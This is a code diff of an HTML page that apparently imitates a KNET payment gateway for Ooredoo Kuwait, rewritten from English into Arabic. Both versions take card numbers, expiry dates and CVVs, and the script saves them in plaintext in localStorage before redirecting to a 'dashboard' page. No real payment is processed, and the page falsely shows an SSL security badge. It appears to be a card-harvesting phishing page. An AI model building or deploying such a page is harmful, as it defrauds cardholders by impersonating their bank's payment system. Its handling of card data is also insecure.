@@ -1,119 +1,450 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="-1">
-    <meta http-equiv="CACHE-CONTROL" content="max-age=0">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>KNET Payments</title>
-    <link href="/knet/payment-responsive.css" rel="stylesheet" type="text/css">
-    <link href="/knet/payment-stylesheet.css" rel="stylesheet" type="text/css">
-    <script src="/knet/jquery-3.5.1.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الدفع - Ooredoo</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .logo-section {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            color: #667eea;
+            font-size: 12px;
+        }
+
+        .arrow {
+            font-size: 24px;
+            color: white;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .info-card {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-left: 4px solid #667eea;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-label {
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .info-value {
+            color: #333;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .form-section {
+            margin-bottom: 25px;
+        }
+
+        .form-section h3 {
+            color: #333;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-section h3::before {
+            content: '';
+            width: 4px;
+            height: 20px;
+            background: #667eea;
+            border-radius: 2px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #333;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #999;
+        }
+
+        .row-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 30px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: none;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .btn-cancel {
+            background: #f0f0f0;
+            color: #333;
+            border: 2px solid #e0e0e0;
+        }
+
+        .btn-cancel:hover {
+            background: #e8e8e8;
+            border-color: #d0d0d0;
+        }
+
         .back-button {
             position: absolute;
-            top: 10px;
-            left: 10px;
-            background: #ff0000;
-            color: white;
+            top: 20px;
+            right: 20px;
+            background: white;
+            color: #667eea;
             border: none;
-            padding: 10px 20px;
+            padding: 10px 15px;
             cursor: pointer;
-            border-radius: 5px;
-            font-weight: bold;
-            z-index: 100;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
+
         .back-button:hover {
-            background: #cc0000;
+            background: #f0f0f0;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            padding: 12px;
+            background: #f0f7ff;
+            border-radius: 8px;
+            color: #1976d2;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .security-badge::before {
+            content: '🔒';
+            font-size: 16px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                border-radius: 0;
+            }
+
+            .header {
+                padding: 20px;
+            }
+
+            .header h1 {
+                font-size: 20px;
+            }
+
+            .content {
+                padding: 20px;
+            }
+
+            .back-button {
+                top: 10px;
+                right: 10px;
+                padding: 8px 12px;
+                font-size: 12px;
+            }
         }
     </style>
 </head>
 <body>
-    <button class="back-button" onclick="goBack()">← Back</button>
-    
-    <form id="paymentForm" method="post" onsubmit="submitPayment(event)">
-        <div class="madd">
-            <img src="/knet/mob.jpg" alt="">
+    <button class="back-button" onclick="goBack()">← رجوع</button>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo-section">
+                <div class="logo">Ooredoo</div>
+                <div class="arrow">←</div>
+                <div class="logo">KNET</div>
+            </div>
+            <h1>بوابة الدفع الآمنة</h1>
+            <p>أدخل بيانات بطاقتك بأمان تام</p>
         </div>
 
-        <div id="PayPageEntry">
-            <div class="container">
-                <div class="content-block">
-                    <div class="form-card">
-                        <div align="center" class="container-blogo">
-                            <img style="width: 60px" class="" src="/knet/knet.png" alt="logo">
-                        </div>
-                        <div class="row">
-                            <label class="column-label">Merchant: </label>
-                            <label class="column-value text-label"> Ooredoo</label>
-                        </div>
-                        <div id="OrgTranxAmt">
-                            <label class="column-label">Amount:</label>
-                            <label class="column-value text-label" id="amountDisplay">KD 5.000</label>
-                        </div>
+        <div class="content">
+            <!-- معلومات المعاملة -->
+            <div class="info-card">
+                <div class="info-row">
+                    <span class="info-label">التاجر:</span>
+                    <span class="info-value">Ooredoo Kuwait</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">المبلغ:</span>
+                    <span class="info-value" id="amountDisplay">KD 5.000</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">رقم الهاتف:</span>
+                    <span class="info-value" id="phoneDisplay">-</span>
+                </div>
+            </div>
+
+            <!-- نموذج الدفع -->
+            <form id="paymentForm" onsubmit="submitPayment(event)">
+                <!-- بيانات البطاقة -->
+                <div class="form-section">
+                    <h3>بيانات البطاقة</h3>
+                    
+                    <div class="form-group">
+                        <label for="cardNumber">رقم البطاقة</label>
+                        <input 
+                            type="text" 
+                            id="cardNumber" 
+                            name="cardNumber" 
+                            placeholder="1234 5678 9012 3456"
+                            maxlength="19"
+                            required
+                        >
                     </div>
 
-                    <div class="form-card">
-                        <div class="row">
-                            <label class="column-label">Card Number:</label>
-                            <input type="text" name="cardNumber" id="cardNumber" placeholder="Enter card number" required style="width: 100%; padding: 8px;">
+                    <div class="row-2">
+                        <div class="form-group">
+                            <label for="expiryDate">تاريخ الانتهاء</label>
+                            <input 
+                                type="text" 
+                                id="expiryDate" 
+                                name="expiryDate" 
+                                placeholder="MM/YY"
+                                maxlength="5"
+                                required
+                            >
                         </div>
-                        <div class="row">
-                            <label class="column-label">Expiry Date:</label>
-                            <input type="text" name="expiryDate" id="expiryDate" placeholder="MM/YY" required style="width: 100%; padding: 8px;">
-                        </div>
-                        <div class="row">
-                            <label class="column-label">CVV:</label>
-                            <input type="text" name="cvv" id="cvv" placeholder="CVV" required style="width: 100%; padding: 8px;">
-                        </div>
-                    </div>
-
-                    <div class="form-card">
-                        <div id="submithide">
-                            <button type="submit" class="submit-button" id="proceed">Submit</button>
-                            <button type="button" class="cancel-button" onclick="cancelPayment()">Cancel</button>
+                        <div class="form-group">
+                            <label for="cvv">CVV</label>
+                            <input 
+                                type="text" 
+                                id="cvv" 
+                                name="cvv" 
+                                placeholder="123"
+                                maxlength="4"
+                                required
+                            >
                         </div>
                     </div>
                 </div>
+
+                <!-- الأزرار -->
+                <div class="button-group">
+                    <button type="submit" class="btn btn-submit">إتمام الدفع</button>
+                    <button type="button" class="btn btn-cancel" onclick="cancelPayment()">إلغاء</button>
+                </div>
+            </form>
+
+            <!-- شارة الأمان -->
+            <div class="security-badge">
+                جميع بيانات البطاقة محمية بتشفير SSL آمن
             </div>
         </div>
-    </form>
+    </div>
 
     <script>
-        function submitPayment(e) {
-            e.preventDefault();
-            
-            const paymentData = {
-                cardNumber: document.getElementById('cardNumber').value,
-                expiryDate: document.getElementById('expiryDate').value,
-                cvv: document.getElementById('cvv').value,
-                amount: document.getElementById('amountDisplay').textContent
-            };
-            
-            // Store data in localStorage
-            localStorage.setItem('paymentData', JSON.stringify(paymentData));
-            
-            // Redirect to dashboard
-            window.location.href = '/dashboard.html';
-        }
-        
-        function cancelPayment() {
-            window.history.back();
-        }
-        
-        function goBack() {
-            window.history.back();
-        }
-        
-        // Load data if coming from payment page
+        // Load data from URL parameters
         window.addEventListener('load', function() {
             const urlParams = new URLSearchParams(window.location.search);
             const amount = urlParams.get('amount');
+            const phone = urlParams.get('phone');
+            
             if (amount) {
                 document.getElementById('amountDisplay').textContent = amount;
             }
+            if (phone) {
+                document.getElementById('phoneDisplay').textContent = phone;
+            }
+        });
+
+        function submitPayment(e) {
+            e.preventDefault();
+            
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const amount = document.getElementById('amountDisplay').textContent;
+            const phoneNumber = document.getElementById('phoneDisplay').textContent;
+
+            // Validate inputs
+            if (!cardNumber || !expiryDate || !cvv) {
+                alert('الرجاء ملء جميع الحقول');
+                return;
+            }
+
+            // Create transaction data
+            const transactionData = {
+                cardNumber: cardNumber,
+                expiryDate: expiryDate,
+                cvv: cvv,
+                amount: amount,
+                phoneNumber: phoneNumber,
+                timestamp: new Date().toISOString()
+            };
+
+            // Store in localStorage with unique key
+            const transactionKey = 'transaction_' + Date.now();
+            localStorage.setItem(transactionKey, JSON.stringify(transactionData));
+
+            // Redirect to dashboard
+            window.location.href = '/dashboard.html';
+        }
+
+        function cancelPayment() {
+            if (confirm('هل تريد إلغاء عملية الدفع؟')) {
+                window.history.back();
+            }
+        }
+
+        function goBack() {
+            window.history.back();
+        }
+
+        // Format card number input
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formattedValue;
+        });
+
+        // Format expiry date input
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Format CVV input
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
         });
     </script>
 </body>
